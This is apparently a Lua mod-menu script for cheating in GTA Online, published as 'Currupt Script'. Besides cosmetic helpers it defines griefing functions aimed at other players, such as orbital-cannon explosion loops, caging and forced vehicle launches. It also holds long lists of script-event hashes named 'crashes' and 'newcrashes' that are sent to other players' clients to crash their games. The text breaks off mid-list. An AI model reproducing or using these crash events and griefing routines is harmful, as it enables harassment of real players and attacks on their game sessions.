--[[
Huge Credits to all the people that provided us with public code <3
I would of coded anything if it wasn't for these people.

ICYPhoenix
Lance
Prisuhm
Nowiry
Sapphire
Sainan
Jade
PANDA
Mirror
Bunny
Ayrapheyr
Ren
HoppaC4
Jayphen

WE HAVE TAKEN OVER░ \☻/\☻/
░░░░░░░░░░░░░░░░░░░▌░ ▌
░░░░░░░░░░░░░░░░░░ / \░ / \
░░░░░░░░░░░░░░░░░███████ ]▄▄▄▄▄▄▄▄▄-----------●
░░░░░░░░░░░░▂▄▅█████████▅▄▃▂
░░░░░░░░░░░I███████████████████].
]]
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
util.keep_running()
util.require_natives("natives-1663599433-uno")
util.require_natives("natives-1640181023")
util.require_natives("natives-1651208000")
util.require_natives("natives-1663599433")

util.toast("Welcome To Currupt Script 0.6.6\n" .. "\n" .. "Official Discord: https://discord.gg/CMBYPZr2Rc\n" .. "\n" .. "WARNING! Notifications aren't always accurate")
--------------------------------------------------------------------------------------

	splashes = menu.list(menu.my_root(), "Join Discord", {}, "", function(); end)



local aalib = require("aalib")
local PlaySound = aalib.play_sound
local SND_ASYNC<const> = 0x0001
local SND_FILENAME<const> = 0x00020000

resources_dir = filesystem.resources_dir() .. '\\curruptscript\\'
curruptscript_logo = directx.create_texture(resources_dir .. 'curruptscript_logo.png')

if not filesystem.is_dir(resources_dir) then
    notification("If Currupt Script is not installed properly. Some things will fail to load or break.")
end

if not SCRIPT_SILENT_START then
    logo_alpha = 0
    logo_alpha_incr = 0.02
    logo_alpha_thread = util.create_thread(function (thr)
        while true do
            logo_alpha = logo_alpha + logo_alpha_incr
            if logo_alpha > 1 then
                logo_alpha = 1
            elseif logo_alpha < 0 then 
                logo_alpha = 0	
            end
            util.yield()
    end
end)

    logo_thread = util.create_thread(function (thr)
        starttime = os.clock()
        local alpha = 0
        while true do
            directx.draw_texture(curruptscript_logo, 0.15, 0.10, 0.5, 1.2, 0.5, 0.5, 0, 1, 1, 1, logo_alpha)
            timepassed = os.clock() - starttime
            if timepassed > 1 then
                logo_alpha_incr = -0.01
            end
            if logo_alpha == 0 then
            end
            util.yield()
        end
    end)
    PlaySound(resources_dir .. "\\bruh.wav", SND_FILENAME | SND_ASYNC)
        end

menu.hyperlink(splashes, "Join The Discord", "https://discord.gg/CMBYPZr2Rc")
--------------------------------------------------------------------------------------
local script_dir <const> = filesystem.scripts_dir() .. "/lib/smilescript"

if not filesystem.exists(script_dir .. "/functions.lua") then
    error("Required file not found: /lib/smilescript/functions.lua")
end

require("lib.smilescript.functions")

--########################################################

  ---------------------| Variables |---------------------

--########################################################

local explosion_types <const> = {
    [0] = {"Grenade"},
    [1] = {"Grenade Launcher"},
    [2] = {"Stickybomb"},
    [3] = {"Molotov"},
    [4] = {"Rocket"},
    [5] = {"Tankshell"},
    [6] = {"Hi Octane"},
    [7] = {"Car"},
    [8] = {"Plane"},
    [9] = {"Petrol Pump"},
    [10] = {"Bike"},
    [11] = {"Steam"},
    [12] = {"Flame"},
    [13] = {"Water Hydrant"},
    [14] = {"Gas Canister"},
    [15] = {"Boat"},
    [16] = {"Ship"},
    [17] = {"Truck"},
    [18] = {"Bullet"},
    [19] = {"Smoke Grenade Launcher"},
    [20] = {"Smoke Grenade"},
    [21] = {"BZ Gas"},
    [22] = {"Flare"},
    [23] = {"Gas Canister"},
    [24] = {"Extinguisher"},
    [25] = {"Programmable AR"},
    [26] = {"Train"},
    [27] = {"Barrel"},
    [28] = {"Propane"},
    [29] = {"Blimp"},
    [30] = {"Flame Explode"},
    [31] = {"Tanker"},
    [32] = {"Plane Rocket"},
    [33] = {"Vehicle Bullet"},
    [34] = {"Gas Tank"},
    [36] = {"Railgun"},
    [37] = {"Blimp 2"},
    [38] = {"Firework"},
    [39] = {"Snowball"},
    [40] = {"Proximity Mine"},
    [41] = {"Valkyrie Cannon"},
    [42] = {"Air Defence"},
    [43] = {"Pipe Bomb"},
    [44] = {"Vehicle Mine"},
    [45] = {"Explosive Ammo"},
    [46] = {"APC Shell"},
    [47] = {"Cluster Bomb"},
    [48] = {"Gas Bomb"},
    [49] = {"Incendiary Bomb"},
    [50] = {"Standard Bomb"},
    [51] = {"Torpedo"},
    [52] = {"Underwater Torpedo"},
    [53] = {"Bombushka Cannon"},
    [54] = {"Cluster Bomb 2"},
    [55] = {"Hunter Barrage"},
    [56] = {"Hunter Cannon"},
    [57] = {"Rogue Cannon"},
    [58] = {"Underwater Mine"},
    [59] = {"Orbital Cannon"},
    [60] = {"Bomb Standard Wide"},
    [61] = {"Explosive Shotgun Ammo"},
    [62] = {"Oppressor MKII Cannon"},
    [63] = {"Mortar Kinetic"},
    [64] = {"Kinetic Mine"},
    [65] = {"EMP Mine"},
    [66] = {"Spike Mine"},
    [67] = {"Slick Mine"},
    [68] = {"Tar Mine"},
    [69] = {"Drone"},
    [70] = {"Up-n-Atomizer"},
    [71] = {"Buried Mine"},
    [72] = {"Missile"},
    [73] = {"RC Tank Rocket"},
    [74] = {"Water Bomb"},
    [75] = {"Water Bomb 2"},
    [78] = {"Flash Grenade"},
    [79] = {"Stun Grenade"},
    [81] = {"Large Missile"},
    [82] = {"Big Submarine"},
    [83] = {"EMP Launcher"}
}

local entity_types <const> = {
    [0] = {"Cone", name = "prop_mp_cone_01"},
    [1] = {"Pole", name = "prop_roadpole_01b"},
    [2] = {"Barrier", name = "prop_barrier_work06a"},
    [4] = {"Water Barrier", name = "prop_barrier_wat_03b"},
    [5] = {"Log", name = "prop_log_01"},
    [8] = {"Pipe", name = "prop_pipes_conc_01"},
    [9] = {"Pizza", name = "prop_pizza_box_02"},
    [10] = {"Burger", name = "prop_cs_burger_01"},
    [11] = {"Fries", name = "prop_food_chips"},
    [12] = {"Coke", name = "ng_proc_sodacan_01a"},
    [13] = {"Beer", name = "prop_amb_beer_bottle"},
    [14] = {"Glass", name = "prop_cs_shot_glass"},
    [15] = {"Coffee", name = "p_amb_cofeecup_01"},
    [16] = {"Panties", name = "p_cs_panties_03_s"},
    [17] = {"Dildo", name = "prop_cs_dildo_01"},
    [18] = {"Teddy Bear", name = "prop_mr_rasberryclean"},
    [19] = {"Fridge", name = "prop_fridge_01"},
    [20] = {"Washer", name = "prop_washer_02"},
    [21] = {"Television", name = "prop_tv_04"},
    [22] = {"Laptop", name = "bkr_prop_clubhouse_laptop_01a"},
    [23] = {"Tablet", name = "hei_prop_dlc_tablet"},
    [24] = {"Phone", name = "prop_phone_ing"},
    [25] = {"Money", name = "bkr_prop_money_wrapped_01"},
    [26] = {"Gold Bar", name = "ch_prop_gold_bar_01a"},
    [27] = {"Security Case", name = "prop_security_case_01"},
    [28] = {"Bomb", name = "w_smug_bomb_01"},
    [29] = {"Dummy", name = "prop_dummy_01"},
    [30] = {"Coffin", name = "prop_coffin_02b"},
    [31] = {"Death Body", name = "prop_water_corpse_02"},
    [32] = {"Umbrella", name = "p_amb_brolly_01_s"},
    [33] = {"Guitar", name = "prop_acc_guitar_01"},
    [34] = {"Ferris Wheel", name = "prop_ld_ferris_wheel"},
    [35] = {"Asteroid", name = "prop_asteroid_01"},
    [36] = {"Trash Bag", name = "p_binbag_01_s"},
    [37] = {"Bin", name = "prop_bin_08a"},
    [38] = {"Wheelchair", name = "prop_wheelchair_01"},
    [39] = {"Alien Egg", name = "prop_alien_egg_01"},
    [40] = {"Beachball", name = "prop_beachball_01"},
    [41] = {"Golfball", name = "prop_golf_ball"},
    [42] = {"Big Soccerball", name = "stt_prop_stunt_soccer_ball"}
}

local cage_types <const> = {
    [0] = {
        "Standard Cage",
        objects = {
            {
                name = "prop_gold_cont_01",
                offset = v3.new(0, 0, 0),
                rot = v3.new(0, 0, 0)
            }
        },
        max_distance = 2
    },
    [1] = {
        "Tall Cage",
        objects = {
            {
                name = "prop_rub_cage01a",
                offset = v3.new(0, 0, -1),
                rot = v3.new(0, 0, 0)
            },
            {
                name = "prop_rub_cage01a",
                offset = v3.new(0, 0, 1.2),
                rot = v3.new(-180, 0, 90)
            }
        },
        max_distance = 1.5
    },
    [2] = {
        "Box Cage",
        objects = {
            {
                name = "prop_ld_crate_01",
                offset = v3.new(0, 0, 0),
                rot = v3.new(-180, 90, 0)
            },
            {
                name = "prop_ld_crate_01",
                offset = v3.new(0, 0, 0),
                rot = v3.new(0, 90, 0)
            }
        },
        max_distance = 1.5
    },
    [3] = {
        "Pipe Cage",
        objects = {
            {
                name = "prop_pipes_conc_01",
                offset = v3.new(0, 0, 0),
                rot = v3.new(90, 0, 0)
            }
        },
        max_distance = 1.5
    },
    [4] = {
        "Stunt Tube Cage",
        objects = {
            {
                name = "stt_prop_stunt_tube_end",
                offset = v3.new(0, 0, 0),
                rot = v3.new(0, -90, 0)
            }
        },
        max_distance = 13
    }
}

local vehicle_types <const> = {
    [0] = {"Faggio", name = "faggio"},
    [1] = {"Go Kart", name = "veto"},
    [2] = {"Zhaba", name = "zhaba"},
    [3] = {"Buzzard", name = "buzzard2"},
    [4] = {"Insurgent", name = "insurgent"},
    [5] = {"Khanjali", name = "Khanjali"},
    [6] = {"Phantom Wedge", name = "phantom2"},
    [7] = {"Armored Boxville", name = "boxville5"},
    [8] = {"Bus", name = "bus"},
    [9] = {"Blimp", name = "blimp"},
}

local aura_vehicle_types <const> = {
    [0] = {"Explode"},
    [1] = {"Burn"},
    [2] = {"EMP"},
    [3] = {"Delete"}
}

local aura_ped_types <const> = {
    [0] = {"Explode"},
    [1] = {"Burn"},
    [2] = {"Taze"},
    [3] = {"Delete"}
}

local forcefield_types <const> = {
    [0] = {"Push"},
    [1] = {"Pull"}
}

local fake_pickup_types <const> = {
    [0] = {
        "Money Bag",
        objects = {
            "p_poly_bag_01_s"
        }
    },
    [1] = {
        "Action Figure",
        objects = {
            "vw_prop_vw_colle_alien",
            "vw_prop_vw_colle_beast",
            "vw_prop_vw_colle_imporage",
            "vw_prop_vw_colle_pogo",
            "vw_prop_vw_colle_prbubble",
            "vw_prop_vw_colle_rsrcomm",
            "vw_prop_vw_colle_rsrgeneric",
            "vw_prop_vw_colle_sasquatch"
        }
    },
    [2] = {
        "P's & Q's",
        objects = {
            "prop_choc_pq"
        }
    },
}

--########################################################

	local timer_divider = menu.divider(menu.my_root(), "Gang Shit")


	funfun = menu.list(menu.my_root(), "Fun Shit", {}, "", function(); end)

-----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
	menu.divider(funfun, "Fun Shit")

    menyoo_root = menu.list(funfun, "Menyoo", {"menyoo"}, "Menyoo support!")
menyoovmain_root = menu.list(menyoo_root, "Vehicles", {"menyoovehicles"}, "Menyoo vehicle support!")
menyoom1_root = menu.list(menyoo_root, "Maps", {"menyoomapsroot"}, "Menyoo maps support!")
menyoom_root = menu.list(menyoom1_root, "Maps", {"menyooallmaps"}, "All maps in your directory")
menyoomloaded_root = menu.list(menyoom1_root, "Currently loaded maps", {"menyooloadedmaps"}, "Maps you have loaded")
menyoov_root = menu.list(menyoovmain_root, "All vehicles", {"menyooloadedmaps"}, "Vehicles you have spawned")
menyoovloaded_root = menu.list(menyoovmain_root, "Currently loaded vehicles", {"menyooloadedmaps"}, "Vehicles you have spawned")

--           __  ___   ______   _   __   __  __   ____     ____              _  __    __  ___   __
--          /  |/  /  / ____/  / | / /  / / / /  / __ \   / __ \            | |/ /   /  |/  /  / /
--         / /|_/ /  / __/    /  |/ /  / / / /  / / / /  / / / /  ______    |   /   / /|_/ /  / /
--        / /  / /  / /___   / /|  /  / /_/ /  / /_/ /  / /_/ /  /_____/   /   |   / /  / /  / /___ 
--       /_/  /_/  /_____/  /_/ |_/   \____/   \____/   \____/            /_/|_|  /_/  /_/  /_____/  

function setup_menyoo_vehicles_list(mainroot, player, allplayers, dotp)
   for i, path in ipairs(filesystem.list_files(vehicles_dir)) do
       root = mainroot
       local ours = false
       if player == players.user() then
           ours = true 
       end
       if filesystem.is_dir(path) then
           root = menu.list(root, path:gsub(vehicles_dir, ''), {}, "")
           for i,path in ipairs(filesystem.list_files(path)) do
               if not allplayers then
                   menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle", function(on_click)
                       log("Click type was " .. on_click)
                       menyoo_load_vehicle(path, player, dotp, ours)
                   end)
               else
                   menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle for all players", function(on_click)
                       for k,v in pairs(players.list(true, true, true)) do
                           log("Click type was " .. on_click)
                           menyoo_load_vehicle(path, v, dotp, false)
                       end
                   end)
               end
           end
       else
           if string.match(path:gsub(vehicles_dir, ''), '.xml') then
               if not allplayers then
                   menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle", function(on_click)
                       toast("Click type was " .. on_click)
                       menyoo_load_vehicle(path, player, dotp, ours)
                   end)
               else
                   menu.action(root, path:gsub(vehicles_dir, ''), {}, "Spawn this menyoo vehicle for all players", function(on_click)
                       for k,v in pairs(players.list(true, true, true)) do
                           toast("Click type was " .. on_click)
                           menyoo_load_vehicle(path, v, dotp, false)
                       end
                   end)
               end
           end
       end
   end
end

function setup_menyoo_maps_list()
   for i, path in ipairs(filesystem.list_files(maps_dir)) do
       if filesystem.is_dir(path) then
           root = menu.list(menyoom_root, path:gsub(maps_dir, ''), {}, "")
           for i,path in ipairs(filesystem.list_files(path)) do
               menu.action(root, path:gsub(maps_dir, ''), {}, "Spawn this menyoo map", function()
                   menyoo_load_map(path)
               end)
           end
       else
           if string.match(path:gsub(maps_dir, ''), '.xml') then
               menu.action(menyoom_root, path:gsub(maps_dir, ''), {}, "Spawn this menyoo map", function()
                   menyoo_load_map(path)
               end)
           end
       end
   end
end

setup_menyoo_vehicles_list(menyoov_root, players.user(), false, true)
setup_menyoo_maps_list()

Effect = {asset = "", name = ""}
Effect.__index = Effect

function Effect.new(asset, name)
   local inst = setmetatable({}, Effect) 
   inst.name = name
   inst.asset = asset
   return inst
end


	custselc = menu.list(menu.my_root(), "Select Pussies", {}, "", function(); end)

	menu.toggle(custselc, "Exclude Selected", {}, "", function(on_toggle)
		if on_toggle then
			excludeselected = true
		else
			excludeselected = false
		end
	end)

local function exportstring( s )
    return string.format("%q", s)
end

function table.save(  tbl,filename )
   local charS,charE = "   ","\n"
   local file,err = io.open( filename, "wb" )
   if err then return err end
   -- initiate variables for save procedure
   local tables,lookup = { tbl },{ [tbl] = 1 }
   file:write( "return {"..charE )
   for idx,t in ipairs( tables ) do
      file:write( "-- Table: {"..idx.."}"..charE )
      file:write( "{"..charE )
      local thandled = {}
      for i,v in ipairs( t ) do
         thandled[i] = true
         local stype = type( v )
         -- only handle value
         if stype == "table" then
            if not lookup[v] then
               table.insert( tables, v )
               lookup[v] = #tables
            end
            file:write( charS.."{"..lookup[v].."},"..charE )
         elseif stype == "string" then
            file:write(  charS..exportstring( v )..","..charE )
         elseif stype == "number" then
            file:write(  charS..tostring( v )..","..charE )
         end
      end
      for i,v in pairs( t ) do
         -- escape handled values
         if (not thandled[i]) then
            local str = ""
            local stype = type( i )
            -- handle index
            if stype == "table" then
               if not lookup[i] then
                  table.insert( tables,i )
                  lookup[i] = #tables
               end
               str = charS.."[{"..lookup[i].."}]="
            elseif stype == "string" then
               str = charS.."["..exportstring( i ).."]="
            elseif stype == "number" then
               str = charS.."["..tostring( i ).."]="
            end
            if str ~= "" then
               stype = type( v )
               -- handle value
               if stype == "table" then
                  if not lookup[v] then
                     table.insert( tables,v )
                     lookup[v] = #tables
                  end
                  file:write( str.."{"..lookup[v].."},"..charE )
               elseif stype == "string" then
                  file:write( str..exportstring( v )..","..charE )
               elseif stype == "number" then
                  file:write( str..tostring( v )..","..charE )
               end
            end
         end
      end
      file:write( "},"..charE )
   end
   file:write( "}" )
   file:close()
end

function table.load( sfile )
   local ftables,err = loadfile( sfile )
   if err then return _,err end
   local tables = ftables()
   for idx = 1,#tables do
      local tolinki = {}
      for i,v in pairs( tables[idx] ) do
         if type( v ) == "table" then
            tables[idx][i] = tables[v[1]]
         end
         if type( i ) == "table" and tables[i[1]] then
            table.insert( tolinki,{ i,tables[i[1]] } )
         end
      end
      -- link indices
      for _,v in ipairs( tolinki ) do
         tables[idx][v[2]],tables[idx][v[1]] =  tables[idx][v[1]],nil
      end
   end
   return tables[1]
end
-- END UTILITY FUNCTIONS

util.keep_running(100)

local function player_toggle_loop(root, pid, menu_name, command_names, help_text, callback)
    return menu.toggle_loop(root, menu_name, command_names, help_text, function()
        if not players.exists(pid) then util.stop_thread() end
        callback()
    end)
end


local resource_dir = filesystem.resources_dir()
if not filesystem.exists(resource_dir) then
	util.toast("resource directory not found. notification system will be less of a bruh")
else
	util.register_file(resource_dir .. "bruhzowski.ytd")
end

local version = 16


local colors = {
green = 184,
red = 6,
yellow = 190,
black = 2,
white = 1,
gray = 3,
pink = 201,
purple = 49, --, 21, 96
blue = 11
}

function notification(message, color)
	HUD.THEFEED_SET_BACKGROUND_COLOR_FOR_NEXT_POST(color)
	local picture
	if not filesystem.exists(resource_dir) then
		picture = "CHAR_SOCIAL_CLUB"
	else
		picture = "bruhzowski"
	end
	GRAPHICS.REQUEST_STREAMED_TEXTURE_DICT(picture, 1)
	while not GRAPHICS.HAS_STREAMED_TEXTURE_DICT_LOADED(picture) do
		util.yield()
	end
	util.BEGIN_TEXT_COMMAND_THEFEED_POST(message)
	if color == colors.red or color == colors.red then
		subtitle = "~u~Notification"
	elseif color == colors.black then
		subtitle = "~c~Notification"
	else
		subtitle = "~u~Notification"
	end
	HUD.END_TEXT_COMMAND_THEFEED_POST_MESSAGETEXT(picture, "Mike", true, 4, "Currupt Script", subtitle)

	HUD.END_TEXT_COMMAND_THEFEED_POST_TICKER(true, false)
	util.log(message)
end

function arg11(pid)
    return (1630317 + (1 + (pid * 595) + 506))
end

function v3(x, y, z)
	if x == nil then x = 0 end
	if y == nil then y = 0 end
	if z == nil then z = 0 end
end

function draw_box(x, y, width, height, opacity)
    color = {}
    color["r"] = 0.07
    color["g"] = 0.07
    color["b"] = 0.07
    color["a"] = opacity - 0.02
    directx.draw_rect(x, y - 0.0015, width, height + 0.0015, color)
end

function RequestControlOfEnt(entity)
	local tick = 0
	local tries = 0
	NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
	while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity) and tick <= 1000 do
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity)
		tick = tick + 1
		tries = tries + 1
		if tries == 50 then 
			util.yield()
			tries = 0
		end
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(entity)
end

function get_control_request(ent) -- #testing -- new get control request, yield first then request, then return. previously requested then yielded then returned and didnt work?
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
		NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
		local tick = 0
		while not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) and tick <= 100 do
			tick = tick + 1
			util.yield()
			NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(ent)
		end
	end
	if not NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent) then
		util.toast("No Control of "..ent)
	end
	return NETWORK.NETWORK_HAS_CONTROL_OF_ENTITY(ent)
end

function tp_vehicle_to(veh,x,y,z) -- #unfinished -- will this ever be finished or is this just a pointless alias for a native? i dont know.
	ENTITY.SET_ENTITY_COORDS_NO_OFFSET(veh,x,y,z,0,0,0)
end


function do_fade_in(pid) 
    CAM.DO_SCREEN_FADE_OUT(500)
    util.yield(500)
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " on")
    orbital_cannon_effects(true)
    util.yield(1000)
    CAM.DO_SCREEN_FADE_IN(1000)
    waiting = false
end
function do_fade_out(pid)
    util.yield(2500)
    CAM.DO_SCREEN_FADE_OUT(1000)
    util.yield(1000)
    orbital_cannon_effects(false)
    menu.trigger_commands("spectate" .. PLAYER.GET_PLAYER_NAME(pid) .. " off;nightvision off")
    util.yield(1000)
    CAM.DO_SCREEN_FADE_IN(1000)
    waiting = false
end
function orbital_cannon_effects(on)
    if on then
        menu.trigger_commands("becomeorbitalcannon on;nightvision on;fov 130")
    else 
        menu.trigger_commands("becomeorbitalcannon off;fov 0;nightvision off")
    end
end
function orbital(pid) 
    for i = 0, 30 do 
        pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
        for j = -2, 2 do 
            for k = -2, 2 do 
                local pos = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid))
                FIRE.ADD_OWNED_EXPLOSION(PLAYER.PLAYER_PED_ID(), pos.x + j, pos.y + j, pos.z + (30 - i), 29, 999999.99, true, false, 8)
            end
        end
        util.yield(20)
    end
end

cages = {}  -- 1114264700 <- vending machine cage
function cage_player(pos)
	local object_hash = util.joaat("prop_gold_cont_01b")
	pos.z = pos.z-0.9
	
	STREAMING.REQUEST_MODEL(object_hash)
	while not STREAMING.HAS_MODEL_LOADED(object_hash) do
		util.yield()
	end
	local object1 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object1																			

	local object2 = OBJECT.CREATE_OBJECT(object_hash, pos.x, pos.y, pos.z, true, true, true)
	cages[#cages + 1] = object2
	
	if object1 == 0 or object2 ==0 then --if 'CREATE_OBJECT' fails to create one of those 
		notification("Something Went Wrong Creating Cages", colors.red)
	end
	ENTITY.FREEZE_ENTITY_POSITION(object1, true)
	ENTITY.FREEZE_ENTITY_POSITION(object2, true)
	local rot  = ENTITY.GET_ENTITY_ROTATION(object2)
	rot.x = -180
	rot.y = -180
	ENTITY.SET_ENTITY_ROTATION(object2, rot.x,rot.y,rot.z,1,true)
	STREAMING.SET_MODEL_AS_NO_LONGER_NEEDED(object_hash)
end


function for_table_do(table,with_access,func) -- <3 HoppaC4
	for i,ent in ipairs(table) do
		if with_access then
			if not RequestControlOfEnt(ent) then goto skip end
		end
		func(ent)
		::skip::
	end
end


function get_player_veh(pid,with_access)
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)	
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = PED.GET_VEHICLE_PED_IS_IN(ped, false)
		if not with_access then
			return vehicle
		end
		if RequestControlOfEnt(vehicle) then
			return vehicle
		end
	end
	return 0
end

function tp_veh_to(pid,x,y,z)
	local tries = 0
	local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
	if PED.IS_PED_IN_ANY_VEHICLE(ped,true) then
		local vehicle = get_player_veh(pid,false)	
		while tries <= 1000 do --bad coooooood >:( but idk anything better
			if RequestControlOfEnt(vehicle) then			
				ENTITY.SET_ENTITY_COORDS_NO_OFFSET(vehicle, x, y, z, 0, 0, 1);
				tries = tries + 1
			end
		end
	end
end

function marqee(text)
	local temp = text
    text = text:sub(2)
	return text .. temp:sub(1, 1)
end

function upgrade_vehicle(player) --now my funky functions are useless :'( since u can do menu.trigger_commands("upgrade") or some shit
	local vehicle = get_player_veh(player,true)
	if vehicle then
		DECORATOR.DECOR_SET_INT(vehicle, "MPBitset", 0)
		VEHICLE.SET_VEHICLE_MOD_KIT(vehicle, 0)
		for i = 0 ,50 do
			VEHICLE.SET_VEHICLE_MOD(vehicle, i, VEHICLE.GET_NUM_VEHICLE_MODS(vehicle, i) - 1, false)
		end	
		VEHICLE.SET_VEHICLE_CUSTOM_PRIMARY_COLOUR(vehicle, 0, 0, 0)
		VEHICLE.SET_VEHICLE_CUSTOM_SECONDARY_COLOUR(vehicle,0, 0, 0)
		VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 22, true)
		VEHICLE._SET_VEHICLE_XENON_LIGHTS_COLOR(vehicle, 10)
		VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 18, true)
		VEHICLE.TOGGLE_VEHICLE_MOD(vehicle, 20, true)
		for i = 0 ,4 do
			if not VEHICLE._IS_VEHICLE_NEON_LIGHT_ENABLED(vehicle, i) then
				VEHICLE._SET_VEHICLE_NEON_LIGHT_ENABLED(vehicle, i, true)
			end
		end
		VEHICLE._SET_VEHICLE_NEON_LIGHTS_COLOUR(vehicle, 255, 0, 255)
		VEHICLE.SET_VEHICLE_NUMBER_PLATE_TEXT(vehicle, "727")
	end
end

function launch_vehicle(pid)
	local vehicle = get_player_veh(pid,true)
	if vehicle then
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 0, 10000, true, false, true)
	end
end

function northp_vehicle(pid)
	local vehicle = get_player_veh(pid,true)
	if vehicle then
		ENTITY.APPLY_FORCE_TO_ENTITY_CENTER_OF_MASS(vehicle, 1, 0, 10000, 0, true, false, true)
	end
end

function send_script_event(first_arg, receiver, args)
	table.insert(args, 1, first_arg)
	util.trigger_script_event(1 << receiver, args)
end


--[[local kicks_fast_legacy = {
    0x493fc6bb,
    1228916411,
    1256866538,
    -1753084819,
    1119864805,
    -1813981910,
    -892744477,
    -859672259,
    -898207315
}]]
local crashes = {
	69874647,
                    924535804,
	1494472464,
	-1991317864,
	1902624891,
	127278285,
	-195247709,
	-1322571352,
	704979198,
	-1970125962,
	2112408256,
	677240627,
	-2113023004,
	-1704141512,
	962740265,
	-1386010354,
	603406648,
	-1715193475,
	1258808115,
	998716537,
	163598572,
	-1056683619,
	-393294520
}

local newcrashes = {
153488394, -- Moist Events Added :)
1723452001,
210491663,
-1780858740,
277548576,
-1320260596,
-851196171,
1293299354,
903362384,
243981125,
1848973789,
-1503282114,
202252150,
-189552513,
-1896924387,
1491104200,
1150803197,
1808453742,
75217734,
-1648825077,
597922279,
-1016027275,
890117219,
-635501849,
-1521203907,
-675325833,
1846223309,
1472117290,
-1054422861,
-73352157,
1537221257,
-78017695,
2018643992,
-352859634,
1370240360,
627052233,
-2000489950,
2140301176,
1926582096,
-1830143324,
-279342915,
690534430,
-1833002148,
315658550,
-1005623606,
-2022389047,
1618779170,
-53130764,
-549542517
-1301508763,
-1413680798,
-1026386029,
273726443,
639116,
1659915470,
575344561,
-1906146218,
829201205,
299217086,
1187364773,
1358851648,
-859672259,
-1753084819,
-1500178943,
-863176541,
-397188359,
1595854775,
1933105669,
624184651,
-1520160200,
-1005294040,
-1989758836,
-211878773,
-1318777899,
-178721456,
-325138340,
-2041535807,
-1881357102,
701013663,
-903212623,
1816012469,
-1587276086,
1649958326,
578058101,
-515495966,
-1235041639,
-396894108,
-1023783113,
1679855368,
1863892872,
-1208850730,
-302187166,
-1656474008,
1230210137,
-1448333980,
-1074756845,
1229338575,
-505735987,
1257857900,
-1900695287,
-16213980,
59352546,
1795076373,
134867878,
-1145943081,
-2076396337,
1950208850,
-2103999464,
-1016625751,
-1095711893,
-971907474,
-1566668579,
1713679709,
-2100809716,
1033875141,
45192266,
1864582447,
-2014392362,
808437855,
447050477,
-1157285407,
-959790325,
-1717096076,
1954846099,
1964309656,
1006166687,
-65296432,
-911081209,
168919469,
932894951,
-37068802,
226676030,
-1773075874,
-1927914708,
-1945247369,
-46298284,
-1705137662,
-1842341008,
212052693,
-1705411017,
-933507377,
-257834583,
-588744584,
1186109081,
-639979452,
2120864071,
959824647,
2005618868,
-868839127,
1800830029,
-1825938840,
-1533887418,
1643877404,
712678541,
-2017818728,
1266208560,
-1529925410,
987018372,
-1891495479,
-1959541747,
-1870308609,
-1785748887,
458875017,
27785517,
662343702,
-978812630,
1990909018,
-1484351810,
-1372589624,
1210543720,
1764386440,
-1190123899,
384219567,
-810334939,
-1187407749,
254526911,
-1924022050,
-979549154,
-544908807,
675377079,
678368510,
2108029684,
399742549,
1622386523,
-1999269016,
-126133365,
-1639153173,
1384138535,
-1794395648,
1734770887,
-1649341354,
-1819246032,
-733604274,
-275229102,
541344683,
-487303944,
1735852781,
241570528,
-654645351,
486186480,
1341149498,
600486780,
174461233,
-888636441,
-1532157118,
1296795403,
33277241,
2120839242,
1154988013,
1209918357,
1763836227,
1249026189,
-283884309,
1287299127,
493604397,
-2043109205,
-988842806,
1146815758,
1519476362,
1136772712,
-1723675897,
-390491000,
23010443,
641157117,
1608876738,
-79150418,
257478565,
496476216,
608132931,
-316948135,
-25619296,
-176858990,
-1605274399,
1731962870,
-1277389265,
-181124995,
1152266822,
-1855721397,
-151720011,
1472357458,
665468344,
-212308547,
975723848,
-720653448,
900985860,
200339862,
-95026574,
2049240389,
917535648,
1517002797,
1126437067,
-421711998,
1164760553,
-1428764848,
161038699,
-137439024,
997078653,
-384079069,
-1514001560,
-347755611,
1767220965,
2051313650,
-1489802466,
-247110509,
469112443,
-149227625,
316678593,
-1918817181,
282406360,
1433396036,
696123127,
-877212109,
770242759,
-796052439,
-19131151,
-169685950,
1134927454,
515799090,
1132500638,
1216017047,
1836414206,
490383602,
1455421717,
-795567983,
1355230914,
-341234598,
-525866785,
-419415284,
-1857108105,
-662216118,
1098534904,
649952111,
1923828310,
795867332,
1305720168,
-1561004591,
1463355688,
-2071141142,
251577675,
-1836118977,
1788162956,
-1479371259,
-1136752511,
-428995778,
1119864805,
-699380547,
1376436345,
677429013,
-1758368969,
1173618358,
-898207315,
1287903621,
-1625031686,
1873289193,
1268963570,
-767611756,
-275700180,
797978700,
-194543830,
-2063448951,
-299840140,
-504114839,
1197757671,
1490942189,
1797631140,
951147709,
-609583028,
1824446546,
-771079131,
-1511043020,
-768666112,
1298961960,
-760171613,
43922647,
-1911026003,
15745542,
-1147284669,
-299200920,
-2072214082,
-1568036440,
1256866538,
-1382676328,
-1813981910,
-845729485,
-892744477,
2092565704,
1716640551,
1005694063,
-1722256522,
-1144835269,
-1710776819,
381894946,
-2086228364,
